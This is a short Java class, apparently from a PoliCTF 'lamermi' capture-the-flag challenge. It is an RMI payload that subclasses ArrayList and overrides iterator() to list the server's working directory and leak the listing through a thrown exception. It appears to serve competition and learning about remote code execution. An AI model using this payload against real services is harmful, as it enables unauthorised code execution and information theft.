package it.polictf.lamermi;

import java.util.*;
import java.io.*;

public class Payload2 extends ArrayList<Integer> {

	public Iterator<Integer> iterator() {
		File cwd = new File(".");
		String msg = cwd.getAbsolutePath() + ": ";
		for (String file : cwd.list())
			msg += file + ", ";
		throw new RuntimeException(msg);
	}
}
